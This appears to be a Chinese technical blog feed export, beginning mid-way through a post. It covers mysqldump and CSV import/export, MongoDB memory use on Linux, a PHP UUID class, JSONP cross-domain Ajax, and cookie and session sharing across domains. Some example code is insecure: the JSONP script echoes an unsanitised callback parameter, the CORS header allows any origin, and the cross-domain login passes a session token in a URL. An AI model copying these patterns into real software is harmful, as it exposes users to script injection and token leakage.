<p>·         –compact</p>
<p>产生少量输出。该选项禁用注释并启用–skip-add-drop-tables、–no-set-names、–skip-disable-keys和–skip-add-locking选项。</p>
<p>·         –compatible=name</p>
<p>产生与其它数据库系统或旧的MySQL服务器更兼容的输出。值可以为ansi、mysql323、mysql40、postgresql、oracle、mssql、db2、maxdb、no_key_options、no_tables_options或者no_field_options。要使用几个值，用逗号将它们隔开。这些值与设置服务器SQL模式的相应选项有相同的含义。</p>
<p>该选项不能保证同其它服务器之间的兼容性。它只启用那些目前能够使转储输出更兼容的SQL模式值。例如，–compatible=oracle 不映射Oracle类型或使用Oracle注释语法的数据类型。</p>
<p>·         –complete-insert，-c</p>
<p>使用包括列名的完整的INSERT语句。</p>
<p>·         –compress，-C</p>
<p>压缩在客户端和服务器之间发送的所有信息（如果二者均支持压缩）。</p>
<p>·         –create-option</p>
<p>在CREATE TABLE语句中包括所有MySQL表选项。</p>
<p>·         —database，-B</p>
<p>转储几个数据库。通常情况，mysqldump将命令行中的第1个名字参量看作数据库名，后面的名看作表名。使用该选项，它将所有名字参量看作数据库名。CREATE DATABASE IF NOT EXISTS db_name和USE db_name语句包含在每个新数据库前的输出中。</p>
<p>·         —debug[=debug_options]，-# [debug_options]</p>
<p>写调试日志。debug_options字符串通常为’d:t:o,file_name’。</p>
<p>·         –default-character-set=charset</p>
<p>使用charsetas默认字符集。如果没有指定，mysqldump使用utf8。</p>
<p>·         –delayed-insert</p>
<p>使用INSERT DELAYED语句插入行。</p>
<p>·         –delete-master-logs</p>
<p>在主复制服务器上，完成转储操作后删除二进制日志。该选项自动启用–master-data。</p>
<p>·         –disable-keys，-K</p>
<pre><code>对于每个表，用/*!40000 ALTER TABLE tbl_name DISABLE KEYS */;和/*!40000 ALTER TABLE tbl_name ENABLE KEYS */;语句引用INSERT语句。这样可以更快地装载转储文件，因为在插入所有行后创建索引。该选项只适合MyISAM表。

·         --extended-insert，-e

使用包括几个VALUES列表的多行INSERT语法。这样使转储文件更小，重载文件时可以加速插入。

·         --fields-terminated-by=...，--fields-enclosed-by=...，--fields-optionally-enclosed-by=...，--fields-escaped-by=...，--行-terminated-by=...

这些选项结合-T选项使用，与LOAD DATA INFILE的相应子句有相同的含义。

·         --first-slave，-x

不赞成使用，现在重新命名为--lock-all-tables。

·         --flush-logs，-F

开始转储前刷新MySQL服务器日志文件。该选项要求RELOAD权限。请注意如果结合--all--database(或-A)选项使用该选项，根据每个转储的数据库刷新日志。例外情况是当使用--lock-all-tables或--master-data的时候：在这种情况下，日志只刷新一次，在所有 表被锁定后刷新。如果你想要同时转储和刷新日志，应使用--flush-logs连同--lock-all-tables或--master-data。

·         --force，-f

在表转储过程中，即使出现SQL错误也继续。

·         --host=host_name，-h host_name

从给定主机的MySQL服务器转储数据。默认主机是localhost。

·         --hex-blob

使用十六进制符号转储二进制字符串列(例如，&#39;abc&#39; 变为0x616263)。影响到的列有BINARY、VARBINARY、BLOB。

·         --lock-all-tables，-x

所有数据库中的所有表加锁。在整体转储过程中通过全局读锁定来实现。该选项自动关闭--single-transaction和--lock-tables。

·         --lock-tables，-l

开始转储前锁定所有表。用READ LOCAL锁定表以允许并行插入MyISAM表。对于事务表例如InnoDB和BDB，--single-transaction是一个更好的选项，因为它不根本需要锁定表。

请注意当转储多个数据库时，--lock-tables分别为每个数据库锁定表。因此，该选项不能保证转储文件中的表在数据库之间的逻辑一致性。不同数据库表的转储状态可以完全不同。

·         --master-data[=value]

该选项将二进制日志的位置和文件名写入到输出中。该选项要求有RELOAD权限，并且必须启用二进制日志。如果该选项值等于1，位置和文件名被写入CHANGE MASTER语句形式的转储输出，如果你使用该SQL转储主服务器以设置从服务器，从服务器从主服务器二进制日志的正确位置开始。如果选项值等于2，CHANGE MASTER语句被写成SQL注释。如果value被省略，这是默认动作。

--master-data选项启用--lock-all-tables，除非还指定--single-transaction(在这种情况下，只在刚开始转储时短时间获得全局读锁定。又见--single-transaction。在任何一种情况下，日志相关动作发生在转储时。该选项自动关闭--lock-tables。

·         --no-create-db，-n

该选项禁用CREATE DATABASE /*!32312 IF NOT EXISTS*/ db_name语句，如果给出---database或--all--database选项，则包含到输出中。

·         --no-create-info，-t

不写重新创建每个转储表的CREATE TABLE语句。

·         --no-data，-d

不写表的任何行信息。如果你只想转储表的结构这很有用。

·         --opt

该选项是速记；等同于指定 --add-drop-tables--add-locking --create-option --disable-keys--extended-insert --lock-tables --quick --set-charset。它可以给出很快的转储操作并产生一个可以很快装入MySQL服务器的转储文件。该选项默认开启，但可以用--skip-opt禁用。要想只禁用确信用-opt启用的选项，使用--skip形式；例如，--skip-add-drop-tables或--skip-quick。

·         --password[=password]，-p[password]

连接服务器时使用的密码。如果你使用短选项形式(-p)，不能在选项和密码之间有一个空格。如果在命令行中，忽略了--password或-p选项后面的 密码值，将提示你输入一个。

·         --port=port_num，-P port_num

用于连接的TCP/IP端口号。

·         --protocol=&#123;TCP | SOCKET | PIPE | MEMORY&#125;

使用的连接协议。

·         --quick，-q

该选项用于转储大的表。它强制mysqldump从服务器一次一行地检索表中的行而不是检索所有行并在输出前将它缓存到内存中。

·         --quote-names，-Q

用‘`’字符引用数据库、表和列名。如果服务器SQL模式包括ANSI_QUOTES选项，用‘&quot;’字符引用名。默认启用该选项。可以用--skip-quote-names禁用，但该选项应跟在其它选项后面，例如可以启用--quote-names的--compatible。

·         --result-file=file，-r file

将输出转向给定的文件。该选项应用在Windows中，因为它禁止将新行‘\\n’字符转换为‘\\r\\n’回车、返回/新行序列。

·         --routines，-R

在转储的数据库中转储存储程序(函数和程序)。使用---routines产生的输出包含CREATE PROCEDURE和CREATE FUNCTION语句以重新创建子程序。但是，这些语句不包括属性，例如子程序定义者或创建和修改时间戳。这说明当重载子程序时，对它们进行创建时定义者应设置为重载用户，时间戳等于重载时间。

如果你需要创建的子程序使用原来的定义者和时间戳属性，不使用--routines。相反，使用一个具有mysql数据库相应权限的MySQL账户直接转储和重载mysql.proc表的内容。

该选项在MySQL 5.1.2中添加进来。在此之前，存储程序不转储。

·         --set-charset

将SET NAMES default_character_set加到输出中。该选项默认启用。要想禁用SET NAMES语句，使用--skip-set-charset。

·         --single-transaction

该选项从服务器转储数据之前发出一个BEGIN SQL语句。它只适用于事务表，例如InnoDB和BDB，因为然后它将在发出BEGIN而没有阻塞任何应用程序时转储一致的数据库状态。

当使用该选项时，应记住只有InnoDB表能以一致的状态被转储。例如，使用该选项时任何转储的MyISAM或HEAP表仍然可以更改状态。

--single-transaction选项和--lock-tables选项是互斥的，因为LOCK TABLES会使任何挂起的事务隐含提交。

要想转储大的表，应结合--quick使用该选项。

·         --socket=path，-S path

当连接localhost(为默认主机)时使用的套接字文件。

·         --skip--comments

参见---comments选项的描述。

·         --tab=path，-T path

产生tab分割的数据文件。对于每个转储的表，mysqldump创建一个包含创建表的CREATE TABLE语句的tbl_name.sql文件，和一个包含其数据的tbl_name.txt文件。选项值为写入文件的目录。

默认情况，.txt数据文件的格式是在列值和每行后面的新行之间使用tab字符。可以使用--fields-xxx和--行--xxx选项明显指定格式。

注释：该选项只适用于mysqldump与mysqld服务器在同一台机器上运行时。你必须具有FILE权限，并且服务器必须有在你指定的目录中有写文件的许可。

·         --tables

覆盖---database或-B选项。选项后面的所有参量被看作表名。

·         --triggers

为每个转储的表转储触发器。该选项默认启用；用--skip-triggers禁用它。

·         --tz-utc

在转储文件中加入SET TIME_ZONE=&#39;+00:00&#39;以便TIMESTAMP列可以在具有不同时区的服务器之间转储和重载。(不使用该选项，TIMESTAMP列在具有本地时区的源服务器和目的服务器之间转储和重载）。--tz-utc也可以保护由于夏令时带来的更改。--tz-utc默认启用。要想禁用它，使用--skip-tz-utc。该选项在MySQL 5.1.2中加入。

·         --user=user_name，-u user_name

连接服务器时使用的MySQL用户名。

·         --verbose，-v

冗长模式。打印出程序操作的详细信息。

·         --version，-V

显示版本信息并退出。

·         --where=&#39;where-condition&#39;, -w &#39;where-condition&#39;

只转储给定的WHERE条件选择的记录。请注意如果条件包含命令解释符专用空格或字符，一定要将条件引用起来。

但是**mysqldump不支持导出指定字段**，顾引出第二种方法如下。 2、INTO OUTFILE（可导出csv格式  导入效率提升） 导出命令

SELECT * FROM [TABLE] INTO OUTFILE &#39;[FILE]&#39;；
或者
SELECT * FROM [TABLE] INTO OUTFILE &#39;[FILE]&#39;
FIELDS TERMINATED BY &#39;,&#39;
OPTIONALLY ENCLOSED BY &#39;&quot;&#39;
LINES TERMINATED BY &#39;\\n&#39;；

SELECT * FROM mytable
INTO OUTFILE &#39;/tmp/mytable.csv&#39;
FIELDS TERMINATED BY &#39;,&#39;
OPTIONALLY ENCLOSED BY &#39;&quot;&#39;
LINES TERMINATED BY &#39;\\n&#39;；

**二、导入** 1）LOAD DATA

LOAD DATA INFILE &#39;[FILE]&#39;
INTO TABLE [TABLE]；
或者
LOAD DATA INFILE &#39;[FILE]&#39;
INTO TABLE [TABLE]
FIELDS TERMINATED BY &#39;,&#39;
OPTIONALLY ENCLOSED BY &#39;&quot;&#39;
LINES TERMINATED BY &#39;\\n&#39;；

LOAD DATA INFILE &#39;/tmp/mytable.csv&#39;
INTO TABLE mytable
FIELDS TERMINATED BY &#39;,&#39;
OPTIONALLY ENCLOSED BY &#39;&quot;&#39;
LINES TERMINATED BY &#39;\\n&#39;;

  2）source source只针对sql文件，测试数据六千万条网页url表信息，导入平均每0.2秒导入5000条数据，大概在四十分钟导入。 3)经常忽略的 和mysqldump相对的 mysqlimport</code></pre>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB内存篇</title>
    <url>/2017/02/23/mongodb%E5%86%85%E5%AD%98%E7%AF%87/</url>
    <content><![CDATA[<p>刚刚接触MongoDB，惊讶于它对内存的贪得无厌，至于个中缘由，先了解下Linux是如何管理内存的，再说说MongoDB是如何使用内存的，答案自然就清楚了。 首先查看MongoDB服务器的top命令结果：</p>
<p>shell&gt; top -p $(pidof mongod)<br>Mem:  32872124k total, 30065320k used,  2806804k free,   245020k buffers<br>Swap:  2097144k total,      100k used,  2097044k free, 26482048k cached</p>
<p> VIRT  RES  SHR %MEM<br>1892g  21g  21g 69.6</p>
<p>这台MongoDB服务器有没有性能问题？大家可以一边思考一边继续阅读。</p>
<h2 id="Linux是如何管理内存的"><a href="#Linux是如何管理内存的" class="headerlink" title="Linux是如何管理内存的"></a><strong>Linux是如何管理内存的</strong></h2><p>在Linux里（别的系统也差不多），内存有物理内存和<a href="http://en.wikipedia.org/wiki/Virtual_memory">虚拟内存</a>之说，物理内存是什么自然无需解释，虚拟内存实际是物理内存的抽象，多数情况下，出于方便性的考虑，程序访问的都是虚拟内存地址，然后操作系统会通过<a href="http://en.wikipedia.org/wiki/Page_table">Page Table</a>机制把它翻译成物理内存地址，详细说明可以参考<a href="http://www.ualberta.ca/CNS/RESEARCH/LinuxClusters/mem.html">Understanding Memory</a>和<a href="http://www.redhat.com/magazine/001nov04/features/vm/">Understanding Virtual Memory</a>，至于程序是如何使用虚拟内存的，可以参考<a href="http://www.snailinaturtleneck.com/blog/2011/08/30/playing-with-virtual-memory/">Playing with Virtual Memory</a>，这里就不多费口舌了。 很多人会把虚拟内存和Swap混为一谈，实际上Swap只是虚拟内存引申出的一种技术而已：操作系统一旦物理内存不足，为了腾出内存空间存放新内容，就会把当前物理内存中的内容放到交换分区里，稍后用到的时候再取回来，需要注意的是，Swap的使用可能会带来性能问题，偶尔为之无需紧张，糟糕的是物理内存和交换分区频繁的发生数据交换，这被称之为Swap颠簸，一旦发生这种情况，先要明确是什么原因造成的，如果是内存不足就好办了，加内存就可以解决，不过有的时候即使内存充足也可能会出现这种问题，比如MySQL就有可能出现这样的情况，一个可选的解决方法是限制使用Swap：</p>
<p>shell&gt; sysctl vm.swappiness=0</p>
<p>查看内存情况最常用的是free命令：</p>
<p>shell&gt; free -m<br>             total       used       free     shared    buffers     cached<br>Mem:         32101      29377       2723          0        239      25880<br>-/+ buffers/cache:       3258      28842<br>Swap:         2047          0       2047</p>
<p>看到used一栏数值偏大，free一栏数值偏小，往往会认为内存要用光了。其实并非如此，之所以这样是因为每当我们操作文件的时候，Linux都会尽可能的把文件缓存到内存里，这样下次访问的时候，就可以直接从内存中取结果，所以cached一栏的数值非常的大，不过不用担心，这部分内存是可回收的，操作系统的虚拟内存管理器会按照<a href="http://en.wikipedia.org/wiki/Cache_algorithms">LRU</a>算法淘汰冷数据。还有一个buffers，也是可回收的，不过它是保留给块设备使用的。 知道了原理，我们就可以推算出系统可用的内存是free + buffers + cached：</p>
<p>shell&gt; echo $((2723 + 239 + 25880))<br>28842</p>
<p>至于系统实际使用的内存是used – buffers – cached：</p>
<p>shell&gt; echo $((29377 - 239 - 25880))<br>3258</p>
<p>除了free命令，还可以使用sar命令：</p>
<p>shell&gt; sar -r<br>kbmemfree kbmemused  %memused kbbuffers  kbcached<br>  3224392  29647732     90.19    246116  26070160</p>
<p>shell&gt; sar -W<br>pswpin/s pswpout/s<br>    0.00      0.00</p>
<p>希望你没有被%memused吓到，如果不幸言中，重读本文。</p>
<h2 id="再说说MongoDB是如何使用内存的"><a href="#再说说MongoDB是如何使用内存的" class="headerlink" title="再说说MongoDB是如何使用内存的"></a>再说说MongoDB是如何使用内存的</h2><p>目前，MongoDB使用的是<a href="http://www.mongodb.org/display/DOCS/Caching">内存映射存储引擎</a>，它会把数据文件映射到内存中，如果是读操作，内存中的数据起到缓存的作用，如果是写操作，内存还可以把随机的写操作转换成顺序的写操作，总之可以大幅度提升性能。MongoDB并不干涉内存管理工作，而是把这些工作留给操作系统的虚拟内存管理器去处理，这样做的好处是简化了MongoDB的工作，但坏处是你没有方法很方便的控制MongoDB占多大内存，幸运的是虚拟内存管理器的存在让我们多数时候并不需要关心这个问题。 MongoDB的内存使用机制让它在缓存重建方面更有优势，简而言之：如果重启进程，那么缓存依然有效，如果重启系统，那么可以通过拷贝数据文件到/dev/null的方式来重建缓存，更详细的描述请参考：<a href="http://blog.mongodb.org/post/10407828262/cache-reheating-not-to-be-ignored">Cache Reheating – Not to be Ignored</a>。 有时候，即便MongoDB使用的是64位操作系统，也可能会遭遇<a href="http://www.mongodb.org/display/DOCS/The+Linux+Out+of+Memory+OOM+Killer">OOM</a>问题，出现这种情况，多半是因为限制了内存的大小所致，可以这样查看当前值：</p>
<p>shell&gt; ulimit -a | grep memory</p>
<p>多数操作系统缺省都是把它设置成unlimited的，如果你的操作系统不是，可以这样修改：</p>
<p>shell&gt; ulimit -m unlimited<br>shell&gt; ulimit -v unlimited</p>
<p>注：ulimit的使用是有上下文的，最好放在MongoDB的启动脚本里。 有时候，MongoDB连接数过多的话，会<a href="http://groups.google.com/group/mongodb-user/browse_thread/thread/18e00ec181f8f377">拖累性能</a>，可以通过<a href="http://www.mongodb.org/display/DOCS/serverStatus+Command">serverStatus</a>查询连接数：</p>
<p>mongo&gt; db.serverStatus().connections</p>
<p>每个连接都是一个线程，需要一个Stack，Linux下缺省的Stack设置一般比较大：</p>
<p>shell&gt; ulimit -a | grep stack<br>stack size              (kbytes, -s) 10240</p>
<p>至于MongoDB实际使用的Stack大小，可以用如下命令确认（单位：K）：</p>
<p>shell&gt; cat /proc/$(pidof mongod)/limits | grep stack | awk -F ‘size’ ‘{print int($NF)/1024}’</p>
<p>如果Stack过大（比如：10240K）的话没有意义，简单对照命令结果中的Size和Rss：</p>
<p>shell&gt; cat /proc/$(pidof mongod)/smaps | grep 10240 -A 10</p>
<p>所有连接消耗的内存加起来会相当惊人，推荐把Stack设置小一点，比如说1024：</p>
<p>shell&gt; ulimit -s 1024</p>
<p>注：从<a href="https://jira.mongodb.org/browse/SERVER/fixforversion/10390">MongoDB1.8.3</a>开始，MongoDB会在启动时自动设置Stack。 有时候，出于某些原因，你可能想释放掉MongoDB占用的内存，不过前面说了，内存管理工作是由虚拟内存管理器控制的，幸好可以使用MongoDB内置的<a href="http://www.mongodb.org/display/DOCS/List+of+Database+Commands">closeAllDatabases</a>命令达到目的：</p>
<p>mongo&gt; use admin<br>mongo&gt; db.runCommand({closeAllDatabases:1})</p>
<p>另外，通过调整内核参数<a href="http://www.kernel.org/doc/Documentation/sysctl/vm.txt">drop_caches</a>也可以释放缓存：</p>
<p>shell&gt; sysctl vm.drop_caches=1</p>
<p>平时可以通过mongo命令行来监控MongoDB的内存使用情况，如下所示：</p>
<p>mongo&gt; db.serverStatus().mem:<br>{<br>    “resident” : 22346,<br>    “virtual” : 1938524,<br>    “mapped” : 962283<br>}</p>
<p>还可以通过<a href="http://www.mongodb.org/display/DOCS/mongostat">mongostat</a>命令来监控MongoDB的内存使用情况，如下所示：</p>
<p>shell&gt; mongostat<br>mapped  vsize    res faults<br>  940g  1893g  21.9g      0</p>
<p>其中内存相关字段的含义是：</p>
<ul>
<li>mapped：映射到内存的数据大小</li>
<li>visze：占用的虚拟内存大小</li>
<li>res：占用的物理内存大小</li>
</ul>
<p>注：如果操作不能在内存中完成，结果faults列的数值不会是0，视大小可能有性能问题。 在上面的结果中，vsize是mapped的两倍，而mapped等于数据文件的大小，所以说vsize是数据文件的两倍，之所以会这样，是因为本例中，MongoDB开启了<a href="http://www.mongodb.org/display/DOCS/Journaling">journal</a>，需要在内存里多映射一次数据文件，如果关闭journal，则vsize和mapped大致相当。 如果想验证这一点，可以在开启或关闭journal后，通过pmap命令来观察文件映射情况：</p>
<p>shell&gt; pmap $(pidof mongod)</p>
<p>到底MongoDB配备多大内存合适？宽泛点来说，多多益善，如果要确切点来说，这实际取决于你的数据及索引的大小，内存如果能够装下全部数据加索引是最佳情况，不过很多时候，数据都会比内存大，比如本文所涉及的MongoDB实例：</p>
<p>mongo&gt; db.stats()<br>{<br>    “dataSize” : 1004862191980,<br>    “indexSize” : 1335929664<br>}</p>
<p>本例中索引只有1G多，内存完全能装下，而数据文件则达到了1T，估计很难找到这么大内存，此时保证内存能装下热数据即可，至于热数据是多少，取决于具体的应用，你也可以通过观察faults的大小来判断当前内存是否能够装下热数据，如果faults持续变大，就说明当前内存已经不能满足热数据的大小了。如此一来内存大小就明确了：内存 &gt; 索引 + 热数据，最好有点富余，毕竟操作系统本身正常运转也需要消耗一部分内存。 关于MongoDB与内存的话题，大家还可以参考<a href="http://www.mongodb.org/display/DOCS/Checking+Server+Memory+Usage">官方文档</a>中的相关介绍。</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>MongoDB</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP生成UUID</title>
    <url>/2017/02/19/php%E7%94%9F%E6%88%90uuid/</url>
    <content><![CDATA[<p>UUID是指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的。通常平台 会提供生成UUID的API。UUID按照开放软件基金会(OSF)制定的标准计算，用到了以太网卡地址、纳秒级时间、芯片ID码和许多可能的数字。由以 下几部分的组合：当前日期和时间(UUID的第一个部分与时间有关，如果你在生成一个UUID之后，过几秒又生成一个UUID，则第一个部分不同，其余相 同)，时钟序列，全局唯一的IEEE机器识别号（如果有网卡，从网卡获得，没有网卡以其他方式获得），UUID的唯一缺陷在于生成的结果串会比较长。关于 UUID这个标准使用最普遍的是微软的GUID(Globals Unique Identifiers)。 在ColdFusion中可以用CreateUUID()函数很简单的生成UUID，其格式为：xxxxxxxx-xxxx-xxxx- xxxxxxxxxxxxxxxx(8-4-4-16)，其中每个 x 是 0-9 或 a-f 范围内的一个十六进制的数字。而标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx (8-4-4-4-12)  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: merlin</span><br><span class="line"> * Date: 15-7-31</span><br><span class="line"> * Time: 下午6:30</span><br><span class="line"> *&#x2F;</span><br><span class="line">class UUID</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 生成UUID</span><br><span class="line">     * @return string</span><br><span class="line">     *&#x2F;</span><br><span class="line">    static public function CreateId()</span><br><span class="line">    &#123;</span><br><span class="line">        if (function\_exists(&#39;com\_create_guid&#39;)) &#123;</span><br><span class="line">            return trim(com\_create\_guid(), &#39;&#123;&#125;&#39;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            mt_srand((double)microtime() * 10000);</span><br><span class="line">            $charid &#x3D; strtoupper(md5(uniqid(rand(), TRUE)));</span><br><span class="line">            $hyphen &#x3D; chr(45);</span><br><span class="line">            $uuid   &#x3D; substr($charid, 0, 8) . $hyphen</span><br><span class="line">                . substr($charid, 8, 4) . $hyphen</span><br><span class="line">                . substr($charid, 12, 4) . $hyphen</span><br><span class="line">                . substr($charid, 16, 4) . $hyphen</span><br><span class="line">                . substr($charid, 20, 12);</span><br><span class="line"></span><br><span class="line">            return $uuid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP Ajax跨域请求</title>
    <url>/2017/02/14/php-ajax%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<p>  在开发过程中，有时会碰到需要请求其它服务器接口的问题，这时候就要jsonp来解决这个问题 html前端</p>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>test</title>
<script src="jquery-1.5.2.min.js"></script>
<script src="ajax.js"></script>
</head>

<body>
<form name="form">
<input type="text" name="sex">
<input type="text" name="age">
<input type="button" id="btn" value="button" />
</form>
</body>
</html>

<p>js前端</p>
<p>$(document).ready(function(){</p>
<pre><code>$(&quot;#btn&quot;).click(function(k) &#123;
    //...
    var j = $(&quot;form&quot;).serializeArray();//序列化name/value
    $.ajax(&#123;
        type: &#39;GET&#39;,  //这里用GET
        url: &#39;ajax.php&#39;,
        dataType: &#39;jsonp&#39;,  //类型
        data: j,
        jsonp: &#39;callback&#39;, //jsonp回调参数，必需
        async: false,
        success: function(result) &#123;//返回的json数据
            alert(result.message); //回调输出

            result = result || &#123;&#125;;
            if (result.msg==&#39;err&#39;)&#123;
                alert(result.info);
            &#125;else if (result.msg==&quot;ok&quot;)&#123;
                alert(&#39;提交成功&#39;);
            &#125;else&#123;
                alert(&#39;提交失败&#39;);
            &#125;

        &#125;,
        timeout: 3000
    &#125;)
    //...
&#125;);</code></pre>
<p>php服务端</p>
<?php
$callback = isset($\_GET\['callback'\]) ? trim($\_GET\['callback'\]) : ''; //jsonp回调参数，必需
$date = array("age"=>$\_GET\['age'\], "message"=>$\_GET\['age'\]);
$date\["msg"\]="err";
$date\["info"\]="因人品问题，发送失败";
$tmp= json_encode($date); //json 数据
echo $callback . '(' . $tmp .')';  //返回格式，必需
?>

<p><strong>另外随着HTML5的快速发展，支持HTML5的浏览器，只需要在PHP的头部加上如下这两句话即可：</strong></p>
<p>//处理跨域<br>    header(“Access-Control-Allow-Origin:*”); //*号表示所有域名都可以访问<br>    header(“Access-Control-Allow-Method:POST,GET”);</p>
]]></content>
      <categories>
        <category>JAVAScript</category>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>JQuery</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>cookie跨域session共享</title>
    <url>/2017/02/14/cookie%E8%B7%A8%E5%9F%9Fsession%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<p>session是存储在服务器的。 本篇主要通过一些实践中的案例和大家分享一下踩到坑，重点说明了cookie跨域问题和session服务器共享问题，以php语言为使用语言进行说明。</p>
<h2 id="先聊聊cookie"><a href="#先聊聊cookie" class="headerlink" title="先聊聊cookie"></a>先聊聊cookie</h2><h3 id="设置cookie无效"><a href="#设置cookie无效" class="headerlink" title="设置cookie无效"></a>设置cookie无效</h3><p>setcookie(“sso”, “e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW”, 900);</p>
<p>  这个问题很多刚入门php的小伙们都会碰到。这个代码的本意应当是想设置cookie sso的有效期为15分钟，可是执行这个代码后发现没有效果。为什么呢？因为第三个参数expire表示的是过期的时间节点，而不是有效时间，所以如果希望设置cookie为15分钟，正确的做法应当是获取当前的时间戳加上15分钟。</p>
<p>setcookie(“sso”, “e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW”, time() + 900);</p>
<p>setcookie这个函数还有path、domain参数都比较常用，强烈建议刚学php的小伙们多翻阅手册。php手册地址： <a href="http://php.net/manual/zh/index.php">http://php.net/manual/zh/index.php</a></p>
<h3 id="获取cookie值获取不到"><a href="#获取cookie值获取不到" class="headerlink" title="获取cookie值获取不到"></a>获取cookie值获取不到</h3><p>先看这样一段代码</p>
<p>setcookie(“sso”, “e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW”, time() + 900);<br>var_dump($_COOKIE[“sso”]);</p>
<p>明明设置了cookie，为什么第一次刷新页面取不到值，第二次刷新页面就可以了呢？ 要解决这个问题，要先了解一下setcookie后发生了什么？因为cookie是保存在客户端的，php是服务端语言，实际上setcookie之后只是在返回的http头增加一个cookie的头信息，告诉客户端需要设置一个酱紫的cookie，如下图：</p>
<p><img src="http://qiniu.fengmumiao.com/Uz6zuiv.png">      </p>
<p>php中setcookie返回的http头</p>
<p>而$_COOKIE这个数组里面保存客户端传递上来的cookie。自然第一次刷新的时候因为客户端没有相应的cookie值，所以$_COOKIE是没有sso的信息的。第一次请求过后，因为服务器设置了cookie sso，所以第一次请求过来客户端就有了cookie sso的信息，所以第二次请求的时候就会带上sso的信息，服务端就能通过$_COOKIE取到值了。</p>
<h3 id="cookie跨域问题"><a href="#cookie跨域问题" class="headerlink" title="cookie跨域问题"></a>cookie跨域问题</h3><p>这个可以说是cookie中一个比较热门的问题，面试的时候一般很爱聊这方面的问题。 跨域的业务需求大概是酱紫：用户在a.com进行了登录，希望在b.com也同步进行了登录。如果是同一个主域比较简单，可以通过setcookie中的domain参数进行设定：例如有x.a.com和xx.a.com，可以通过设置domain为a.com，从而a.com的所有二级域名都可以共享这一个cookie。基于安全方面的原因，在a.com下面设置domain为b.com是无效的。 那么是否真的没有办法可以实现这个了呢？这个还是有一些奇巧淫技的，这里介绍一种使用内框iframe的方法。 具体思路：在a.com下设置cookie后，嵌入一个iframe框链接b.com的页面，b.com设置好页面cookie后，再嵌入一个a.com的页面，然后通过parent.parent就可以调用最外层的a.com的js方法，从而进行跳转或者一些其它的操作。具体代码示例如下： 假设a.com有页面：login.php和callback.php，b.com有页面synclogin.php a.com的login.php代码：</p>
<?php
$sso = "e589hR6VnO8K1CNQZ4PSP/LWGBhRKE5VckawQwl1TdE8d4Q5E7tW";
setcookie("sso", $sso);
?>
<p>login success…</p>
<script type="text/javascript">
    function jumpTo() {
        location.href = "http://a.com";
    }
</script>
<iframe src="http://b.com/synclogin.php?sso=<?php echo $sso; ?>"></iframe>

<p>b.com的synclogin.php页面</p>
<?php
setcookie("sso", $_GET["sso"]);
?>
<iframe src="http://a.com/callback.php"></iframe>

<p>a.com的callback.php页面</p>
<script type="text/javascript">
    parent.parent.jumpTo();
</script>

<p>代码看起来也不难，值得一提的是这里嵌入了两个iframe，因为如果只用一个iframe的话，即在b.com的synclogin.php内直接调用父窗体的jumpTo方法，在有些浏览器下会提示没有权限的错误：</p>
<p>Error: Permission denied to access property</p>
<p>这里只是演示了cookie跨域同步的思路，具体细节还有很多可以改进的地方，比如iframe链接的页面可以考虑改成静态的页面，这样效率会比php动态页面快很多，还有像参数校验、多个主域（比如还有c.om）同时登录等等，这里就不再累述。 cookie的总结到这里就结束，如果你感觉有一些收获，可以在页面底部扫码给我打赏哟，感谢O(∩_∩)O~</p>
<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><h3 id="SESSION没有值"><a href="#SESSION没有值" class="headerlink" title="$_SESSION没有值"></a>$_SESSION没有值</h3><p>这个session使用和cookie有一点不太一样，session使用前必须先调用session_start方法。否则会收到一个undefined的错误：</p>
<p>Notice: Undefined variable: _SESSION</p>
<h3 id="session存储在哪"><a href="#session存储在哪" class="headerlink" title="session存储在哪"></a>session存储在哪</h3><p>session存储在服务端，但是session究竟是存储在哪呢？php.ini中关于session有一个save_path的选项可以设置存放的目录，如果这个选项没有设置值，那么就存储在系统默认的tmp目录下。默认的tmp目录可以通过sys_get_temp_dir方法取到。 例如在mac下面，php的session一般会存储在/var/tmp目录下。</p>
<p>session_start();<br>echo session_id();//本例输出ipkl446enhae25uq92c28u4lo3<br>$_SESSION[‘name’] = “tony”;<br>$_SESSION[‘users’] = array(“tony”, “andy”);</p>
<p>通过session_id方法可以取到当前的session编号，通过这个编号可查看一下该session文件。</p>
<p>$ sudo more /var/tmp/sess_ipkl446enhae25uq92c28u4lo3<br>name|s:4:”tony”;users|a:2:{i:0;s:4:”tony”;i:1;s:4:”andy”;}</p>
<p>可以清楚的看到session存储数据的结构，其中值是用序列化的方式进行转化存储的。</p>
<h3 id="session也用了cookie"><a href="#session也用了cookie" class="headerlink" title="session也用了cookie"></a>session也用了cookie</h3><p>session不是存储在服务端吗，怎么又和cookie扯上关系了？其实想想也简单，因为客户端再请求的时候，服务端怎么样才能知道该客户端的session存储在哪个文件呢？其实也是通过cookie PHPSESSID来进行标识。</p>
<p><img src="http://qiniu.fengmumiao.com/zyqeQn.png">      <br>php中session的cookie标识</p>
